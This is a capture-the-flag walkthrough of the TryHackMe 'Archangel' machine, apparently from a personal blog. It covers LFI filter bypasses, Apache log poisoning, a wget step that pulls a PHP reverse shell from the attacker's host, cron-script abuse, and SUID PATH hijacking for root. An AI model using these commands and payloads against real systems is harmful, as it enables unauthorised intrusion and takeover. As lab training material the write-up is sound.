+++
title = "THM - Archangel Walkthrough"
date = "2021-11-19T00:00:00+13:00"
draft = false
+++

After a brief hiatus due to a few changes that have been going around. I would like to introduce another walkthrough for a basic machine, Archangel. This box can be found [here](https://tryhackme.com/room/archangel)

![](/images/ping_archangel.png)

We can start this box by setting up our VPN (or attack box) and making sure the box is online by pinging the provided IP. Then, we add the machine IP (10.10.88.100) to the /etc/hosts files so it is easier to mention the IP when using tools, we add it as “archangel.thm”.

![](/images/hosts_archangel.png)

From here a RustScan is used. What I like to do is first use a rust scan to see what ports are open first, then use an Nmap scan to whittle down those ports and see what is running on those ports. We can use a rust scan to find the ports ( no added information ) just to verify if they are open, then with Nmap, we can see what is running and more extended info on it, without having to check all ports, or the top 2000.

![](/images/nmap_archangel.png)

With our rust scan, we find 22 (SSH) and 80 (HTTP) ports open. We can run an Nmap scan using:

>

nmap -sC -sV -p 22,80 archangel.thm -oN initial_scan This will give us the more in-depth data we need on these ports. The Nmap scan output shows the HTTP server as Apache 2.4.29 (*this is the standard version at the time of writing*), “Wavefire” is the webserver title and the SSH is up to date as well.

The output shows Apache 2.4.29 for the webserver, this is the standard version at the time of writing so that is fine. Wavefire is the tile, SSH is up to date as well.

That means that the easiest way to get into the machine will have to be on the webserver. On the webserver, the first thing we can see is a basic web server and some contact information. Based on the info, we can go back to our /etc/hosts file and change “archangel.thm” to “mafialive.thm”.

![](/images/webpage_archangel.png)

After we add this host, when we visit that host we can see an “underdevelopment” page and a flag for us. This website is still our only option to get into the box, so we should run a directory traversal scan to see what else might be vulnerable. We can run a directory traversal scan by using:

>

ffuf -c -w /usr/share/seclists/Discovery/Web-Content-common.txt -u http://mafialive.thm/FUZZ

A FFUF directory traversal shows us a robots.txt file connected to this webpage.

![](/images/directory_traversal_archangel.png)

In the robots.txt file, we can see that there is a “test.php” file. When we head to the test.php file we can see that it is a test page, not meant to be deployed. There is a button, this button points to this URL “/var/www/html/development_testing/mrrobot.php” It looks like we’ll need to use LFI. When using the normal backticks “../../../../”, we get an error, “sorry, that’s not allowed.”

Hacktricks has a great library of tricks and clever ways to bypass blocks and other sorts. We can use the RFI/LFI section to find a way around this block. (Can be found here) to find a way around this block. We can use the LFI/RFI section. We can insert*“php://filter/convert.base64-encode/resource=”*after view=, to get around this block, this will encode what it is showing us in base64, so after we decode it we are good to go. So we can try this on the*/var/www/html/development_testing/mrrobot.php*file. Our output is:

>

PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==

We decode this to get:

>

<?php echo 'Control is an illusion'; ?>

We can try this same method on the test.php file. Our output is:

>

PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==” We decode this to get “<?php echo 'Control is an illusion'; ?>”

We can try this same method on the test.php file. Our output is

>

“CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==

This gives us the php code and a hidden flag when we decode. When analysing the code, it checks for*“../..”*, with linux we can bypass this by using double forward slashes*“//”*. Now let's try to read the /etc/passwd file using double forward slashes.

Using*“/..//..//..//..//..//etc//passwd”*. When we use this, it works! Now we need to find some place on the machine where we can write PHP to. Let’s check if we can find any log files we can use. (You can find a ton [here](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/))”*“/var/log/apache2/access.log”*would be a useful location, let’s check if it exists. The file exists, now lets poison this log by sending a request with PHP in the useragent header, so when the webapp reads this it will execute it.

![](/images/lfi_archangel.png)

(You can find more information about local file inclusion through log poisoning [here](https://dheerajdeshmukh.medium.com/get-reverse-shell-through-log-poisoning-with-the-vulnerability-of-lfi-local-file-inclusion-e504e2d41f69)) You could set the User-Agent to any term, for example, Delicious Oranges, if it pops up in the log then you can confirm that you have log poisoning. We will need to make a PHP reverse shell and host it locally. Revshells has a great collection of reverse shells and is easy to use (you can find it [here](https://www.revshells.com/)).

You will need to save your reverse shell in a .php file, in my case I used “shell.php” Host a Python HTTP Server using:

>

python -m http.server 8080

![](/images/hosts_archangel.png)

After that pull our shell into the server using our cmd function. Add a*“&cmd=wget%20http://YOURIP:8080/shell.php”*, this uses the function we specified in the request shown above.
![](/images/pull_archangel.png)

Set up a Netcat listener on your machine on the port you specified in the reverse shell. Then to run our reverse shell, add*“&cmd=php%20shell.php”*to the end of your URL.
![](/images/shell_archangel.png)

Using some basic searching we can find our user flag in Archangel’s home directory. Now that we found our user flag, the only things left to do are to get root on this machine and get our 2nd user flag.

We should check cron jobs first to see if we can exploit anything in there. We can do this by using:

>

cat /etc/crontab

We can see that*“/opt/helloword.sh”*is a file that we have permission to edit. Using Revshells again, we can generate a reverse shell to escalate more, this time we will use a bash reverse shell. Set up a listener and wait for your reverse shell to pop up.

![](/images/arch_archangel.png)

Now that we have a shell as Archangel, we can get our 2nd user flag and move on to the endgame.

In Archangel’s home folder, there is a secret folder. In that secret folder, there is a backup file. It is owned by root and is -rwsr-xr-x, this makes it a good candidate, as the*x*is the SUID Bit of the file. SUID Bits define the permissions of the file, how they can be edited, run, and by who. For a good external explanation on sticky bits on linux, check [here](https://www.liquidweb.com/kb/how-do-i-set-up-setuid-setgid-and-sticky-bits-on-linux/).

We have "execute" permissions on this file so we can run it and see what will happen. We can also see that the file will run as root (from the SUID Bit). When we run the file it tries to run a file called “cp”, so why don't we make a separate cp file and add a little privilege escalation in there.

![](/images/privesc_archangel.png)

Now we can go and run our backup file again, and when it runs cp we can get root.

![](/images/root_archangel.png)

We have root and can get our root flag to finish the box.